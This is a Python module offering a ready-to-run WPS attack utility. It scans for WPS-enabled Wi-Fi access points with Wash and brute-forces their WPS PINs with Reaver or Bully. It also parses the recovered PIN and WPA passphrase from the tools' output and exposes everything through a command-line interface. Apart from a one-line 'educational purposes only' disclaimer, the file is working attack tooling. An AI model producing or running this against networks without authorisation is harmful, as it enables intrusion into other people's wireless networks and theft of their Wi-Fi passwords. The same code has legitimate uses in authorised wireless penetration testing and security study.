# modules/wps_attack.py

import subprocess
import os
import sys
import shutil
import re
import argparse
import signal
import time

# --- Configuration ---
REAVER_COMMAND = "reaver"
BULLY_COMMAND = "bully"
WASH_COMMAND = "wash"  # For scanning WPS networks
SUDO_COMMAND = "sudo"
# ---------------------

# Global dictionary to keep track of running attack processes
# { "reaver_BSSID": Popen_object, "bully_BSSID": Popen_object }
running_attack_processes = {}


def _is_tool_installed(name):
    if shutil.which(name) is None:
        print(f"[!] Error: '{name}' command not found. Please install it.")
        return False
    return True


def _stop_attack_process(attack_name_key):
    """Stops a specific tracked attack process if it's running."""
    global running_attack_processes
    if attack_name_key in running_attack_processes:
        process = running_attack_processes[attack_name_key]
        if process and process.poll() is None:
            print(f"[*] Attempting to stop {attack_name_key} (PID: {process.pid})...")
            try:
                # Reaver/Bully usually respond to SIGINT
                if os.geteuid() == 0 or process.args[0] != SUDO_COMMAND:
                    process.send_signal(signal.SIGINT)
                else:
                    os.kill(process.pid, signal.SIGINT)
                process.wait(timeout=5)
                print(f"[+] {attack_name_key} stopped.")
            except subprocess.TimeoutExpired:
                print(f"[!] {attack_name_key} did not respond to SIGINT, sending SIGTERM/SIGKILL.")
                process.terminate()
                try:
                    process.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    process.kill()
            except Exception as e:
                print(f"[!] Error stopping {attack_name_key}: {e}. Force killing.")
                process.kill()
            del running_attack_processes[attack_name_key]
            return True
    return False


def _start_long_running_attack(attack_key, command_list, use_sudo=True):
    """
    Starts a long-running attack tool like Reaver or Bully.
    Manages the process in running_attack_processes.
    """
    global running_attack_processes
    if attack_key in running_attack_processes and running_attack_processes[attack_key].poll() is None:
        print(
            f"[!] An attack for '{attack_key}' seems to be already running (PID: {running_attack_processes[attack_key].pid}).")
        print(f"    Stop it first or use a different identifier if targeting another BSSID with the same tool.")
        return None, None  # Indicate already running

    cmd = list(command_list)
    if use_sudo and os.geteuid() != 0:
        if not _is_tool_installed(SUDO_COMMAND): return None, None
        cmd.insert(0, SUDO_COMMAND)

    tool_name = cmd[1] if use_sudo and len(cmd) > 1 else cmd[0]
    print(f"[*] Starting {tool_name} for {attack_key}: {' '.join(cmd)}")
    print(f"[+] {tool_name} will now run. Output will be streamed to this terminal.")
    print(f"[+] Press Ctrl+C in THIS window to attempt to stop {tool_name}.")

    try:
        # Stream output directly for these tools
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        running_attack_processes[attack_key] = process
        return process, tool_name
    except FileNotFoundError:
        print(f"[!] Error: Command '{cmd[0]}' not found.")
        return None, None
    except Exception as e:
        print(f"[!] Error starting {tool_name} for {attack_key}: {e}")
        return None, None


def scan_wps_networks_wash(interface, channel=None, sort_by_rssi=False, timeout=None):
    """
    Scans for WPS-enabled networks using Wash.

    :param interface: Wireless interface in MONITOR MODE.
    :param channel: (Optional) Specific channel to scan.
    :param sort_by_rssi: (Optional) If True, sort output by RSSI.
    :param timeout: (Optional) Duration in seconds to run wash.
    :return: A list of dictionaries, each representing a WPS-enabled network, or None on error.
    """
    print(f"[*] Scanning for WPS-enabled networks on {interface} using {WASH_COMMAND}...")
    print(f"[!] Ensure '{interface}' is in MONITOR MODE for Wash.")

    if not _is_tool_installed(WASH_COMMAND): return None
    if os.geteuid() != 0 and not _is_tool_installed(SUDO_COMMAND): return None

    cmd = [WASH_COMMAND, "-i", interface]
    if channel:
        cmd.extend(["-c", str(channel)])
    if sort_by_rssi:
        cmd.append("-s")  # Sort by RSSI
    cmd.append("-j")  # Output in JSON format if available (check wash --help, older versions might not have it)
    # If -j not available, parse text output

    # Prepare command with sudo
    final_cmd = [SUDO_COMMAND] + cmd if os.geteuid() != 0 else cmd
    print(f"[*] Executing: {' '.join(final_cmd)}")
    if timeout: print(f"[*] Wash will run for {timeout} seconds.")

    wash_proc = None
    parsed_networks = []
    try:
        # Wash can run for a while, capture its output
        wash_proc = subprocess.Popen(final_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        running_attack_processes["wash_scan"] = wash_proc  # Track it

        # Attempt to read output, handle timeout
        stdout_data, stderr_data = "", ""
        try:
            stdout_data, stderr_data = wash_proc.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            print("[!] Wash scan timed out. Stopping Wash...")
            _stop_attack_process("wash_scan")  # Helper will remove from dict
            # Try to get any output produced so far
            stdout_data = wash_proc.stdout.read() if wash_proc.stdout else ""
            stderr_data = wash_proc.stderr.read() if wash_proc.stderr else ""
        finally:
            if "wash_scan" in running_attack_processes:  # Ensure removed if not stopped by timeout
                del running_attack_processes["wash_scan"]

        if wash_proc.returncode != 0 and not stdout_data:  # Check return code if no data
            print(f"[-] Wash command failed with exit code {wash_proc.returncode}.")
            if stderr_data: print(f"    Stderr: {stderr_data.strip()}")
            return None

        # Try to parse Wash output (JSON if -j worked, otherwise text)
        # For simplicity, this example will parse the standard text output.
        # BSSID              Channel RSSI WPS Version WPS Locked ESSID
        # --------------------------------------------------------------------------------
        # AA:BB:CC:DD:EE:FF     11  -50  1.0         No         MyNetwork
        header_skipped = False
        for line in stdout_data.splitlines():
            line = line.strip()
            if not line or line.startswith("---") or "BSSID" in line:  # Skip headers/separators
                if "BSSID" in line: header_skipped = True
                continue
            if not header_skipped: continue  # Wait for header

            parts = re.split(r'\s{2,}', line)  # Split by 2 or more spaces
            if len(parts) >= 6:  # BSSID, Channel, RSSI, WPS Ver, Locked, ESSID
                try:
                    network = {
                        "bssid": parts[0],
                        "channel": int(parts[1]),
                        "rssi": int(parts[2]),
                        "wps_version": parts[3],
                        "wps_locked": parts[4],
                        "essid": " ".join(parts[5:])  # ESSID can have spaces
                    }
                    parsed_networks.append(network)
                except ValueError:  # If int conversion fails for channel/rssi
                    print(f"[!] Warning: Could not parse Wash line: {line}")
                    continue

        if parsed_networks:
            print(f"[+] Found {len(parsed_networks)} WPS-enabled networks.")
        else:
            print("[-] No WPS-enabled networks found by Wash or failed to parse output.")
            if stdout_data: print(f"    Wash output:\n{stdout_data.strip()}")

        return parsed_networks

    except KeyboardInterrupt:
        print("\n[!] Wash scan interrupted by user.")
        _stop_attack_process("wash_scan")
        return None  # Or return what was parsed so far
    except Exception as e:
        print(f"[-] An error occurred during Wash scan: {e}")
        _stop_attack_process("wash_scan")
        return None


def wps_attack_reaver(interface, target_bssid, channel=None, essid=None, pin=None,
                      additional_options=None):
    """
    Starts a WPS PIN brute-force attack using Reaver.

    :param interface: Wireless interface in MONITOR MODE.
    :param target_bssid: BSSID of the target AP.
    :param channel: (Optional) Channel of the target AP.
    :param essid: (Optional) ESSID of the target AP (helps Reaver).
    :param pin: (Optional) Specific 4 or 8 digit PIN to try first or only.
    :param additional_options: (Optional) List of other raw command-line options for Reaver.
    :return: Tuple (found_pin, found_psk) or (None, None) if not found or error.
    """
    print(f"[*] Starting WPS brute-force with Reaver on BSSID: {target_bssid}")
    print(f"[!] Ensure '{interface}' is in MONITOR MODE.")

    if not _is_tool_installed(REAVER_COMMAND): return None, None

    attack_key = f"reaver_{target_bssid.replace(':', '')}"

    cmd = [
        REAVER_COMMAND,
        "-i", interface,
        "-b", target_bssid,
        "-vvv",  # Max verbosity for more output to parse
        "--fail-wait=360",  # Example: wait longer on failure
        # "-a", # Auto-detect best options (can be good)
        # "-S", # Use small DH keys (faster, less secure APs)
    ]
    if channel:
        cmd.extend(["-c", str(channel)])
    if essid:
        cmd.extend(["-e", essid])
    if pin:
        cmd.extend(["-p", pin])  # Try a specific PIN

    if additional_options and isinstance(additional_options, list):
        cmd.extend(additional_options)

    reaver_proc, tool_name = _start_long_running_attack(attack_key, cmd, use_sudo=True)
    if not reaver_proc:
        return None, None

    found_pin, found_psk = None, None
    try:
        for line in iter(reaver_proc.stdout.readline, ''):
            sys.stdout.write(f"[{tool_name}] {line}")  # Stream output
            sys.stdout.flush()

            # Reaver success patterns:
            # "[+] WPS PIN: '12345670'"
            # "[+] WPA PSK: 'MySecretPassword'"
            # "[+] AP SSID: 'MyNetworkName'"
            pin_match = re.search(r"WPS PIN:\s*'(\d+)'", line)
            if pin_match:
                found_pin = pin_match.group(1)
                print(f"\n\033[92m[SUCCESS] Reaver found WPS PIN: {found_pin}\033[0m")

            psk_match = re.search(r"WPA PSK:\s*'(.*)'", line)
            if psk_match:
                found_psk = psk_match.group(1)
                print(f"\n\033[92m[SUCCESS] Reaver found WPA PSK: {found_psk}\033[0m")

            if found_pin and found_psk:  # Both found, Reaver might exit or continue session.
                print("[+] Reaver likely completed successfully.")
                # _stop_attack_process(attack_key) # Optionally stop it now
                # break # Or let it finish its session / timeout

            # Check for lockout
            if "WPS LOCKED" in line.upper() or "FAILED TO ASSOCIATE" in line.upper() or "TIMEOUT" in line.upper():
                print(
                    f"[-] Warning: Reaver reported possible AP lockout, timeout, or association failure on {target_bssid}.")
                # Consider stopping or pausing attack if lockout detected.

        reaver_proc.stdout.close()
        reaver_proc.wait()  # Wait for process to fully exit
        if attack_key in running_attack_processes: del running_attack_processes[attack_key]

    except KeyboardInterrupt:
        print(f"\n[!] Reaver attack on {target_bssid} interrupted by user.")
    except Exception as e:
        print(f"[!] An error occurred during Reaver attack on {target_bssid}: {e}")
    finally:
        _stop_attack_process(attack_key)  # Ensure it's stopped

    return found_pin, found_psk


def wps_attack_bully(interface, target_bssid, channel=None, essid=None, pin=None,
                     additional_options=None):
    """
    Starts a WPS PIN brute-force attack using Bully.

    :param interface: Wireless interface in MONITOR MODE.
    :param target_bssid: BSSID of the target AP.
    :param channel: (Optional) Channel of the target AP.
    :param essid: (Optional) ESSID of the target AP.
    :param pin: (Optional) Specific PIN or range (e.g., 1234, 12345670, 1234-5678).
    :param additional_options: (Optional) List of other raw command-line options for Bully.
    :return: Tuple (found_pin, found_psk) or (None, None) if not found or error.
    """
    print(f"[*] Starting WPS brute-force with Bully on BSSID: {target_bssid}")
    print(f"[!] Ensure '{interface}' is in MONITOR MODE.")

    if not _is_tool_installed(BULLY_COMMAND): return None, None

    attack_key = f"bully_{target_bssid.replace(':', '')}"
    # Bully command structure is different: bully <options> <interface>
    # It often requires BSSID and ESSID/Channel to lock onto the target.
    cmd = [
        BULLY_COMMAND,
        interface,  # Interface is positional argument for bully
        "-b", target_bssid,
        # "-v", "3", # Verbosity level (1-4)
        # Bully's default options are often quite aggressive.
        # Consider adding delays: -d <sec>, -D <sec>
        # --lockwait <sec>
    ]
    if channel:
        cmd.extend(["-c", str(channel)])
    if essid:
        cmd.extend(["-e", essid])  # Bully often needs ESSID
    if pin:
        cmd.extend(["-p", pin])  # Specify pin or pin range

    if additional_options and isinstance(additional_options, list):
        cmd.extend(additional_options)

    bully_proc, tool_name = _start_long_running_attack(attack_key, cmd, use_sudo=True)
    if not bully_proc:
        return None, None

    found_pin, found_psk = None, None
    try:
        for line in iter(bully_proc.stdout.readline, ''):
            sys.stdout.write(f"[{tool_name}] {line}")  # Stream output
            sys.stdout.flush()

            # Bully success patterns:
            # "[+] Index: ...  PIN: 12345670  SSID: MyNetwork  PSK: MySecretPassword"
            # "[+] Pin: 12345670"
            # "[+] Key: MySecretPassword"
            # Look for lines starting with "[+] Key:" or "[+] Pin:" or a full summary line

            pin_match = re.search(r"\[\+\]\sPin:\s*(\d+)", line)
            if pin_match:
                found_pin = pin_match.group(1)
                print(f"\n\033[92m[SUCCESS] Bully found WPS PIN: {found_pin}\033[0m")

            key_match = re.search(r"\[\+\]\sKey:\s*(.+)", line)
            if key_match:
                found_psk = key_match.group(1).strip()
                print(f"\n\033[92m[SUCCESS] Bully found WPA PSK: {found_psk}\033[0m")

            # More comprehensive line for Bully
            summary_match = re.search(r"PIN:\s*(\d+)\s+SSID:\s*.+?\s+PSK:\s*(.+)", line)
            if summary_match:
                if not found_pin: found_pin = summary_match.group(1)
                if not found_psk: found_psk = summary_match.group(2).strip()
                print(f"\n\033[92m[SUCCESS] Bully found PIN: {found_pin}, PSK: {found_psk}\033[0m")

            if found_pin and found_psk:
                print("[+] Bully likely completed successfully.")
                # _stop_attack_process(attack_key)
                # break

            if "LOCKOUT" in line.upper() or "TIMEOUT" in line.upper() or "FAILURE" in line.upper():
                print(f"[-] Warning: Bully reported possible AP lockout, timeout or failure on {target_bssid}.")

        bully_proc.stdout.close()
        bully_proc.wait()
        if attack_key in running_attack_processes: del running_attack_processes[attack_key]

    except KeyboardInterrupt:
        print(f"\n[!] Bully attack on {target_bssid} interrupted by user.")
    except Exception as e:
        print(f"[!] An error occurred during Bully attack on {target_bssid}: {e}")
    finally:
        _stop_attack_process(attack_key)

    return found_pin, found_psk


# --- Main execution for demonstration ---
def main():
    parser = argparse.ArgumentParser(description="WPS Attack Utilities (Wash, Reaver, Bully).")
    subparsers = parser.add_subparsers(dest="command", title="Available commands", required=True)

    # Wash (scan) subparser
    wash_parser = subparsers.add_parser("scan", help="Scan for WPS-enabled networks with Wash.")
    wash_parser.add_argument("interface", help="Wireless interface in MONITOR MODE.")
    wash_parser.add_argument("-c", "--channel", type=int, help="Specific channel to scan.")
    wash_parser.add_argument("-s", "--sort", action="store_true", help="Sort Wash output by RSSI.")
    wash_parser.add_argument("-t", "--timeout", type=int, help="Duration (seconds) for Wash scan.")

    # Reaver subparser
    reaver_parser = subparsers.add_parser("reaver", help="Attack WPS PIN with Reaver.")
    reaver_parser.add_argument("interface", help="Wireless interface in MONITOR MODE.")
    reaver_parser.add_argument("bssid", help="Target BSSID (MAC address).")
    reaver_parser.add_argument("-c", "--channel", type=int, help="Target AP channel.")
    reaver_parser.add_argument("-e", "--essid", help="Target AP ESSID (optional but helpful).")
    reaver_parser.add_argument("-p", "--pin", help="Specific PIN to try (4 or 8 digits).")
    reaver_parser.add_argument("--opts", nargs='*', help="Additional raw options for Reaver (e.g., --opts '-a' '-S').")

    # Bully subparser
    bully_parser = subparsers.add_parser("bully", help="Attack WPS PIN with Bully.")
    bully_parser.add_argument("interface", help="Wireless interface in MONITOR MODE.")
    bully_parser.add_argument("bssid", help="Target BSSID (MAC address).")
    bully_parser.add_argument("-c", "--channel", type=int, help="Target AP channel.")
    bully_parser.add_argument("-e", "--essid", help="Target AP ESSID (often needed by Bully).")
    bully_parser.add_argument("-p", "--pin", help="Specific PIN or PIN range to try (e.g. 1234, 1234-5678).")
    bully_parser.add_argument("--opts", nargs='*', help="Additional raw options for Bully (e.g., --opts '-F' '-T').")

    args = parser.parse_args()

    print("=======================================================")
    print("                  WPS Attack Utility                   ")
    print("=======================================================")
    print("Disclaimer: Educational purposes ONLY. Unauthorized access is illegal.")
    print(f"[!] Ensure '{args.interface}' is in MONITOR MODE for attacks/scans.")
    print("=======================================================\n")

    if os.geteuid() != 0:
        print("[!] The tools used in this script (Reaver, Bully, Wash) require root privileges.")
        print("    This script will attempt to use 'sudo'. Ensure your user has sudo rights.")

    # Global signal handler for graceful shutdown
    def signal_handler_main(sig, frame):
        print(f"\n[!] Signal {sig} received by main script. Cleaning up any running attack processes...")
        for key in list(running_attack_processes.keys()):  # Iterate over a copy of keys
            _stop_attack_process(key)
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler_main)
    signal.signal(signal.SIGTERM, signal_handler_main)

    try:
        if args.command == "scan":
            networks = scan_wps_networks_wash(args.interface, args.channel, args.sort, args.timeout)
            if networks:
                print("\n[+] Wash Scan Results (WPS-enabled APs):")
                for net in networks:
                    print(f"  BSSID: {net['bssid']}, Chan: {net['channel']}, RSSI: {net['rssi']}, "
                          f"WPS Ver: {net['wps_version']}, Locked: {net['wps_locked']}, ESSID: {net['essid']}")

        elif args.command == "reaver":
            pin, psk = wps_attack_reaver(
                args.interface, args.bssid, args.channel, args.essid, args.pin, args.opts
            )
            if pin or psk:
                print("\n[+] Reaver attack finished with results:")
                if pin: print(f"    WPS PIN: {pin}")
                if psk: print(f"    WPA PSK: {psk}")
            else:
                print("\n[-] Reaver attack finished. No PIN/PSK found or an error occurred.")

        elif args.command == "bully":
            pin, psk = wps_attack_bully(
                args.interface, args.bssid, args.channel, args.essid, args.pin, args.opts
            )
            if pin or psk:
                print("\n[+] Bully attack finished with results:")
                if pin: print(f"    WPS PIN: {pin}")
                if psk: print(f"    WPA PSK: {psk}")
            else:
                print("\n[-] Bully attack finished. No PIN/PSK found or an error occurred.")
    except Exception as e:
        print(f"[!!!] An unexpected critical error occurred in main: {e}")
    finally:
        # Final cleanup call in case signal handler wasn't fully effective or script exited another way
        for key in list(running_attack_processes.keys()):
            _stop_attack_process(key)
        print("\n[*] WPS attack script finished.")


if __name__ == "__main__":
    main()